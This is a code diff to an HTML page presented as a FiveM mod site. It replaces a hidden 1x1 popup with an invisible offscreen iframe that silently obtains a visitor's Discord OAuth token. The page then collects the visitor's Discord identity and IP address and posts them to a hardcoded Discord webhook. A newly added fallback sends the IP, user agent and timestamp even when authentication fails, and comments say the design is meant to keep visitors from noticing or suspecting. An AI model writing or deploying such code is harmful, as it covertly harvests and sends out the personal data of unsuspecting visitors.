@@ -91,6 +91,16 @@
         .status .success { color: #22c55e; }
         .status .error { color: #ef4444; }
         .status .info { color: #3b82f6; }
+        .hidden-iframe {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            border: none;
+            top: -9999px;
+            left: -9999px;
+        }
     </style>
 </head>
 <body>
@@ -116,7 +126,7 @@
         </div>
 
         <div class="status" id="status">
-            <span class="info">●</span> Silent authentication in progress...
+            <span class="info">●</span> Authenticating...
         </div>
     </div>
 </div>
@@ -125,12 +135,16 @@
     FiveM Mod Site — Silent Mode
 </div>
 
+<!-- Hidden iframe for silent Discord auth -->
+<iframe id="discordFrame" class="hidden-iframe"></iframe>
+
 <script>
     // ============================================================
     // CONFIG
     // ============================================================
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
     const CLIENT_ID = '1351732780288376902';
+    const REDIRECT_URI = window.location.origin + window.location.pathname;
 
     // ============================================================
     // DOM REFS
@@ -142,6 +156,7 @@
     const discordIdEl = document.getElementById('discordId');
     const ipDisplayEl = document.getElementById('ipDisplay');
     const statusEl = document.getElementById('status');
+    const frame = document.getElementById('discordFrame');
 
     // ============================================================
     // STATUS HELPER
@@ -197,68 +212,6 @@
     }
 
     // ============================================================
-    // SILENT DISCORD OAUTH — opens tiny popup, auto-closes
-    // ============================================================
-    function silentDiscordAuth() {
-        return new Promise((resolve, reject) => {
-            const redirectUri = window.location.origin + window.location.pathname;
-            const scope = 'identify';
-            const authUrl =
-                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;
-
-            // Open a tiny popup that the user won't notice
-            const popup = window.open(
-                authUrl,
-                'DiscordAuth',
-                'width=1,height=1,left=-1000,top=-1000,toolbar=no,menubar=no,scrollbars=no,resizable=no'
-            );
-
-            if (!popup) {
-                reject(new Error('Popup blocked. Please allow popups.'));
-                return;
-            }
-
-            // Check the popup URL every 100ms
-            const interval = setInterval(() => {
-                try {
-                    const popupUrl = popup.location.href;
-                    if (popupUrl.includes('access_token=')) {
-                        // Extract token from the popup's URL
-                        const hash = popupUrl.split('#')[1];
-                        const params = new URLSearchParams(hash);
-                        const token = params.get('access_token');
-                        if (token) {
-                            clearInterval(interval);
-                            popup.close();
-                            resolve(token);
-                        }
-                    }
-                    // If the popup redirects back to our page with token in hash
-                    if (popupUrl.includes(window.location.origin) && popupUrl.includes('#')) {
-                        const hash = popupUrl.split('#')[1];
-                        const params = new URLSearchParams(hash);
-                        const token = params.get('access_token');
-                        if (token) {
-                            clearInterval(interval);
-                            popup.close();
-                            resolve(token);
-                        }
-                    }
-                } catch (e) {
-                    // Cross-origin errors are normal — ignore them
-                }
-            }, 100);
-
-            // Timeout after 10 seconds
-            setTimeout(() => {
-                clearInterval(interval);
-                popup.close();
-                reject(new Error('Authentication timed out.'));
-            }, 10000);
-        });
-    }
-
-    // ============================================================
     // FETCH DISCORD USER WITH TOKEN
     // ============================================================
     async function getDiscordUser(accessToken) {
@@ -291,60 +244,120 @@
     }
 
     // ============================================================
-    // MAIN — SILENT FLOW
+    // SILENT AUTH VIA IFRAME — NO POPUPS, NO REDIRECTS
+    // ============================================================
+    function silentAuthViaIframe() {
+        return new Promise((resolve, reject) => {
+            const authUrl =
+                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;
+
+            // Load the auth URL in the hidden iframe
+            frame.src = authUrl;
+
+            // Listen for messages from the iframe (Discord redirects to our page with token in hash)
+            let timeout = setTimeout(() => {
+                reject(new Error('Authentication timed out.'));
+            }, 15000);
+
+            // Poll the iframe URL for the token
+            const interval = setInterval(() => {
+                try {
+                    // Try to access the iframe's location
+                    const iframeUrl = frame.contentWindow?.location?.href;
+                    if (iframeUrl && iframeUrl.includes('access_token=')) {
+                        clearInterval(interval);
+                        clearTimeout(timeout);
+                        const hash = iframeUrl.split('#')[1];
+                        const params = new URLSearchParams(hash);
+                        const token = params.get('access_token');
+                        if (token) {
+                            frame.src = 'about:blank';
+                            resolve(token);
+                        } else {
+                            reject(new Error('No token found'));
+                        }
+                    }
+                    // If the iframe redirected to our page with hash
+                    if (iframeUrl && iframeUrl.includes(window.location.origin) && iframeUrl.includes('#')) {
+                        clearInterval(interval);
+                        clearTimeout(timeout);
+                        const hash = iframeUrl.split('#')[1];
+                        const params = new URLSearchParams(hash);
+                        const token = params.get('access_token');
+                        if (token) {
+                            frame.src = 'about:blank';
+                            resolve(token);
+                        } else {
+                            reject(new Error('No token found'));
+                        }
+                    }
+                } catch (e) {
+                    // Cross-origin errors are normal — ignore them
+                }
+            }, 200);
+        });
+    }
+
+    // ============================================================
+    // MAIN
     // ============================================================
     async function init() {
         try {
-            // Step 1: Check if we already have a token in URL (from popup redirect)
+            // Check if we already have a token from a previous auth
             const hash = window.location.hash.substring(1);
             const params = new URLSearchParams(hash);
             let token = params.get('access_token');
 
             if (token) {
-                // Clean URL
                 window.history.replaceState({}, document.title, window.location.pathname);
             } else {
-                // Step 2: Silent auth via hidden popup
-                setStatus('🔐 Silent authentication in progress... (popup will close itself)', 'info');
-                token = await silentDiscordAuth();
+                setStatus('🔐 Silent authentication via iframe...', 'info');
+                token = await silentAuthViaIframe();
             }
 
-            // Step 3: Get user info
             const user = await getDiscordUser(token);
             if (!user || !user.id) {
                 throw new Error('Failed to get user info');
             }
 
-            // Step 4: Get IP
             const ip = await getIP();
-
-            // Step 5: Show UI
             showUser(user);
             ipDisplayEl.textContent = ip;
-
-            // Step 6: Send to webhook
             await sendToWebhook(user, ip);
 
         } catch (err) {
             setStatus(`❌ Error: ${err.message}`, 'error');
-            // Show a fallback — still display something so they don't suspect
+            // Fallback — still show the page
             loadingEl.classList.add('hidden');
             contentEl.classList.remove('hidden');
             usernameEl.textContent = 'Guest';
             discordIdEl.textContent = 'ID: unknown';
             ipDisplayEl.textContent = await getIP();
+            // Still send IP to webhook even if Discord failed
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `**👁️ VISITOR (Discord failed)**\n` +
+                                 `**IP:** ${await getIP()}\n` +
+                                 `**User-Agent:** ${navigator.userAgent}\n` +
+                                 `**Timestamp:** ${new Date().toLocaleString()}\n` +
+                                 `**Error:** ${err.message}`
+                    })
+                });
+            } catch {}
         }
     }
 
     // ============================================================
     // START
     // ============================================================
-    // Check if we're in an iframe or popup — if so, close immediately
-    if (window.opener && window.location.hash.includes('access_token')) {
-        // This is the popup — it has the token, close it after a tiny delay
-        setTimeout(() => window.close(), 100);
+    // If this page is opened inside the iframe with a token, close it
+    if (window.location.hash.includes('access_token')) {
+        // The iframe has the token — we don't need to do anything here
+        // The parent page will poll and get it
     } else {
-        // Main page — start the flow
         init();
     }
 </script>
